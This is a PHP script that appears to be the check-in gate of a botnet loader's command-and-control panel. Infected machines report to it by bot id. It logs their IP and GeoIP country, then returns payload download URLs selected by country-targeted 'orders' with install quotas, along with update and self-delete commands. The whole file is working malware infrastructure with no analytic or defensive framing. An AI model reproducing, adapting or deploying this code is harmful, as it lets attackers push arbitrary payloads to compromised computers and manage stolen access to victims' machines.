<?php

error_reporting(0);

if (!preg_match('/^[a-f0-9]{8}$/', $_GET['id'])) die;
$id = $_GET['id'];

function stoporder ($orderid) {
	$f = fopen('data/orders.dat', 'a+');
	flock($f,LOCK_EX);
	$orders='';
	while(!feof($f)) $orders.=fgets($f);
	$orders = explode("\n",$orders);
	while (current($orders)) {
		$ORDER = unserialize(current($orders));
		if ($ORDER['id']==$orderid) {
			$ORDER['status']='off';
			$orders[key($orders)] = serialize($ORDER);
			break;
		}
		next($orders);
	}
	ftruncate ($f,0);
	fputs($f, implode("\n",$orders));
	fflush ($f);
	flock($f,LOCK_UN);
	fclose($f);
}

$this_path = "http://".$_SERVER['SERVER_NAME'].substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], '/')+1);

include 'include/mysql.php';
mysql_connect($db_host, $db_user, $db_pass) or die;
mysql_select_db($db_name) or die;

$row = mysql_fetch_array(mysql_query("SELECT ip, country, version, nextload, orders, onboard FROM bots WHERE id='$id' LIMIT 1"));

$ip = sprintf("%u\n", ip2long($_SERVER['REMOTE_ADDR']));
$ip = str_replace("\r", "", $ip);
$ip = str_replace("\n", "", $ip);

if ($row['ip']!=$ip) {
	include('include/geoip.php');
	$gi = geoip_open('include/GeoIP.dat',0);
	$country = geoip_country_id_by_addr($gi, $_SERVER['REMOTE_ADDR']);
	geoip_close($gi);
	$changed = true;
}
else $country = $row['country'];

$time = time();
$row['nextload'] = intval($row['nextload']);
$onboard  = intval($row['onboard']);
$dsorders = $row['orders'];

$ORDERS = file('data/orders.dat');
$disabled = explode(' ', $row['orders']);

$aaaaaa = "";

$mtime = intval(filemtime('data/update.dat'));
if ($row['ip'] and $row['version']<$mtime) {
	$aaaaaa .= $this_path."file.php?upd;";
	$updated = true;
}

while (current($ORDERS)) {
	$ORDER = unserialize(current($ORDERS));

	if ($ORDER['status']=='on' and !in_array($ORDER['id'], $disabled) and ($ORDER['force'] or $time>$row['nextload']) and strstr($ORDER['countries'], ' '.$country.' ')) {

		$f = fopen('data/'.$ORDER['id'].'i.dat', 'a+');
		flock($f,LOCK_EX);
		while($s=fgets($f,1000)) $temp.=$s;
		if (substr_count($temp, "\n")>=$ORDER['need']-1) stoporder($ORDER['id']);
		fputs($f, $_SERVER['REMOTE_ADDR'].':'.$id.':'.$country."\n");
		fflush ($f);
		flock($f,LOCK_UN);
		fclose($f);

		$row['nextload'] = $time + ($ORDER['ban']*60*60);
		$dsorders .= ' '.$ORDER['id'];
		$onboard++;

		$aaaaaa .= $ORDER['url'];
		if ($ORDER['kill']) {
			$aaaaaa .= $this_path."file.php?del;";
			break;
		}
		$loaded = true;
	}
	next($ORDERS);
}

echo $aaaaaa;

$nextload = $row['nextload'];

if ($row['ip']) {
	mysql_query ("UPDATE bots SET lastknock=$time".
	(($loaded)?(", nextload=$nextload, orders='$dsorders', onboard=$onboard"):('')).
	(($changed)?(", ip=$ip, country=$country"):('')).
	(($updated)?(", version=$mtime"):(''))." WHERE id='$id'");
}
else mysql_query("INSERT INTO bots VALUES ('$id', $ip, $country, $time, $mtime, $time, $nextload, '$dsorders', $onboard)");

?>